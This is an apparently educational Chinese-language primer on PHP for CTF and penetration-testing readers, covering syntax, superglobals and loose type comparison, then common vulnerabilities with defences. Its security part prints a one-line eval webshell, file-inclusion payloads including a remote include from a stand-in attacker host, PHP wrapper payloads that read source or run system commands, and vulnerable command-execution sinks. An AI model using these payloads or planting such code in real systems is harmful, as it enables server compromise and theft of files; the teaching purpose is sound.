# PHP

> 专为 Web 设计的脚本语言，曾经几乎统治了整个互联网服务端。如今 WordPress、Joomla 等大量 CMS 以及许多遗留系统仍运行在 PHP 上。CTF 和渗透测试中经常碰到。

---

## 一眼认出这是 PHP

```php
<?php
// 注释：// 或 /* */ 或 #
# 也可以用井号（少见）

// 变量必须以 $ 开头——这是 PHP 最明显的特征
$name = "Alice";
$age = 25;
$items = array(1, 2, 3);          // 旧式数组
$items = [1, 2, 3];               // 新式数组（PHP 5.4+）

// 字符串拼接用 . 号（不是 +）
echo "Hello, " . $name;           // 输出：Hello, Alice

// 关联数组（就是字典/哈希表）
$user = [
    "name" => "Alice",
    "role" => "admin"
];

// 函数定义
function greet($name) {
    return "Hello, " . $name;
}

// PHP 代码嵌入 HTML（这是 PHP 最原始的使用方式）
?>
<h1>Welcome, <?php echo $name; ?></h1>
```

---

## 常用场景

| 场景 | 说明 |
|------|------|
| CMS | WordPress, Drupal, Joomla |
| 电商 | Magento, WooCommerce |
| 框架 | Laravel, Symfony, ThinkPHP（国产） |
| 遗留系统 | 大量老旧的政府/企业网站 |
| 一句话木马 | `<?php @eval($_POST['cmd']); ?>` |

---

## 关键概念

### PHP 文件运行方式

```
浏览器请求 .php → Web 服务器（Apache/Nginx）→ PHP 解释器 → 生成 HTML → 返回浏览器
```

PHP 是服务端脚本——浏览器永远不会看到 PHP 源码，只看到执行后的输出。

### 超全局变量

PHP 自带一些在任何作用域都能访问的变量：

```php
$_GET['id']        // URL 参数 ?id=123 的值
$_POST['user']     // POST 表单数据
$_REQUEST['x']     // 同时包含 GET、POST、COOKIE 数据（不要用，来源混乱）
$_COOKIE['token']  // Cookie 值
$_SERVER['REMOTE_ADDR']  // 客户端 IP
$_FILES['upload']  // 上传文件
$_SESSION['uid']   // 会话数据
```

### 弱类型与类型比较

PHP 的类型比较是臭名昭著的安全陷阱：

```php
// == 松散比较（自动类型转换）
"123" == 123          // true
"abc" == 0            // true（字符串转为 0）
"0e123456" == "0e999999"  // true（科学计数法，都是 0）
null == false         // true
0 == false            // true
"admin" == 0          // true
"admin" == true       // true

// === 严格比较（类型和值都要相同）
"123" === 123         // false
0 === false           // false

// 安全建议：始终使用 === 而非 ==
```

### include / require

在 PHP 中引用其他文件：

```php
include 'config.php';        // 文件不存在时警告，继续运行
require 'config.php';        // 文件不存在时致命错误，停止运行
include_once 'config.php';   // 只引用一次（防止重复定义）
```

---

## 安全相关

PHP 是 Web 漏洞重灾区，以下是最常见的攻击面：

### 文件包含漏洞（LFI/RFI）

```php
// 危险：用户可控路径
$page = $_GET['page'];
include($page . ".php");

// 攻击：?page=../../etc/passwd
// 攻击：?page=http://attacker.com/shell（远程包含）
```

### PHP 伪协议

PHP 有一套特有的流协议，在渗透测试中经常利用：

```
php://filter/convert.base64-encode/resource=config.php   # 以 base64 读取源码
php://input                                              # 读取 POST 原始数据
phar://shell.phar/shell.php                              # phar 反序列化
data://text/plain,<?php system('id');?>                  # 直接执行代码
```

### 反序列化

```php
// 危险：unserialize 用户可控
$obj = unserialize($_GET['data']);
// 攻击者构造 POP 链（Property Oriented Programming）实现代码执行
```

### 命令执行

```php
system($_GET['cmd']);         // 执行系统命令并输出
exec($_GET['cmd'], $output);  // 执行并捕获输出
shell_exec($_GET['cmd']);     // 执行并返回完整输出
passthru($_GET['cmd']);       // 执行并输出原始数据
backticks: `$_GET['cmd']`;    // 反引号等价于 shell_exec
```

| 风险 | 常见触发点 | 防御 |
|------|-----------|------|
| SQL 注入 | `$_GET['id']` 直接拼 SQL | 参数化查询（PDO prepared statement） |
| XSS | `echo $_GET['msg']` | `htmlspecialchars()` |
| 文件包含 | `include($_GET['page'])` | 白名单，禁用 `allow_url_include` |
| 反序列化 | `unserialize($_GET['data'])` | 不要反序列化用户输入 |
| 命令执行 | 上述函数 + 用户输入 | `escapeshellcmd()` / `escapeshellarg()` |

---

## 简单总结

- **变量以 `$` 开头**：这是识别 PHP 最快的方式
- **`.php` 后缀**：URL 以 `.php` 结尾多半是 PHP
- **== 与 === 完全不同**：安全审计中看到 `==` 就要警觉
- **伪协议是 PHP 独有的攻击面**：`php://filter` 可以读源码，`phar://` 可以反序列化
- **大量 CMS 用 PHP**：WordPress 市占率 40%+，知道它是 PHP 就不会惊讶
